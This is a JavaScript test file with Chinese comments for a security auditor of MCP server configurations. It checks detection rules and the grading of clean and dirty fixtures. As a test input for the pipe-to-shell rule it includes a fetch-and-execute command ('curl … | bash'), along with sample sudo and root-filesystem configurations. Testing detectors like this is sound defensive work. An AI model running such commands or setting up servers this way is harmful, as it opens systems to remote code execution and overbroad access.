const assert = require("assert");
const { auditServer, auditAll } = require("../lib/rules");
const { loadFile } = require("../lib/scan");

// ── 规则级锚点 ──

// 明文密钥
const f1 = auditServer("db", { command: "node", args: [], env: { DATABASE_PASSWORD: "hunter2-but-long" } });
assert.ok(f1.some((f) => f.rule === "plaintext-secret"), "明文密码应命中");
const f1b = auditServer("db", { command: "node", args: [], env: { DATABASE_PASSWORD: "${DB_PASS}" } });
assert.ok(!f1b.some((f) => f.rule === "plaintext-secret"), "变量引用不应命中");
const f1c = auditServer("db", { command: "node", args: [], env: { LOG_LEVEL: "debug" } });
assert.ok(!f1c.some((f) => f.rule === "plaintext-secret"), "非密钥 env 不应命中");

// 整盘文件系统访问
const f2 = auditServer("fs", { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/"] });
assert.ok(f2.some((f) => f.rule === "entire-disk-filesystem" && f.severity === "critical"), "根目录应判 critical");
assert.ok(auditServer("fs", { command: "npx", args: ["x", "C:\\"] }).some((f) => f.rule === "entire-disk-filesystem"));
assert.ok(auditServer("fs", { command: "npx", args: ["x", "~"] }).some((f) => f.rule === "entire-disk-filesystem"));
assert.ok(!auditServer("fs", { command: "npx", args: ["x", "/Users/me/work"] }).some((f) => f.rule === "entire-disk-filesystem"), "项目目录不应命中");

// 明文 HTTP
assert.ok(auditServer("r", { url: "http://mcp.example.com" }).some((f) => f.rule === "insecure-remote-url"));
assert.ok(!auditServer("r", { url: "http://127.0.0.1:3000" }).some((f) => f.rule === "insecure-remote-url"), "回环地址豁免");
assert.ok(!auditServer("r", { url: "https://mcp.example.com" }).some((f) => f.rule === "insecure-remote-url"));

// npx 未锁版本
assert.ok(auditServer("n", { command: "npx", args: ["-y", "@scope/server"] }).some((f) => f.rule === "unpinned-npx-package"));
assert.ok(!auditServer("n", { command: "npx", args: ["-y", "@scope/server@0.6.2"] }).some((f) => f.rule === "unpinned-npx-package"));

// 管道执行
const f5 = auditServer("i", { command: "bash", args: ["-c", "curl https://x.dev/i.sh | bash"] });
assert.ok(f5.some((f) => f.rule === "pipe-to-shell" && f.severity === "critical"));

// sudo
assert.ok(auditServer("s", { command: "sudo", args: ["node", "x.js"] }).some((f) => f.rule === "elevated-privileges"));

// 通配符参数
assert.ok(auditServer("w", { command: "node", args: ["**/*.log"] }).some((f) => f.rule === "wildcard-filesystem-arg"));

// 干净服务器不应误报
const clean = auditServer("ok", { command: "uvx", args: ["mcp-server-fetch"] });
assert.strictEqual(clean.length, 0, "干净服务器不应有 findings，实际 " + JSON.stringify(clean));

// ── 夹具整体评分 ──

const cleanFile = loadFile(require("path").join(__dirname, "..", "fixtures", "clean.json"));
const cleanResult = auditAll([cleanFile]);
assert.strictEqual(cleanResult.findings.filter((f) => f.severity === "critical" || f.severity === "high").length, 0, "clean 夹具不应有 high/critical");
assert.strictEqual(cleanResult.grade, "A", "clean 夹具应为 A 级");
assert.strictEqual(cleanResult.score, 100);

const dirtyFile = loadFile(require("path").join(__dirname, "..", "fixtures", "dirty.json"));
const dirtyResult = auditAll([dirtyFile]);
assert.strictEqual(dirtyFile.servers.length, 6, "dirty 夹具应解析出 6 个 server");
const byRule = Object.fromEntries(dirtyResult.findings.map((f) => [f.rule, true]));
for (const rule of ["entire-disk-filesystem", "plaintext-secret", "insecure-remote-url", "pipe-to-shell", "elevated-privileges"]) {
  assert.ok(byRule[rule], "dirty 夹具应命中 " + rule);
}
assert.ok(dirtyResult.findings.filter((f) => f.rule === "unpinned-npx-package").length >= 1, "应命中未锁版本");
assert.ok(dirtyResult.score <= 40, "dirty 夹具分数应 ≤ 40，实际 " + dirtyResult.score);
assert.strictEqual(dirtyResult.grade, "F");

// 重复定义检测
const dupResult = auditAll([cleanFile, loadFile(require("path").join(__dirname, "..", "fixtures", "clean.json"))]);
assert.ok(dupResult.findings.some((f) => f.rule === "duplicate-definition"), "重复定义应报 info");

console.log("ALL MCP-AUDIT TESTS PASSED");
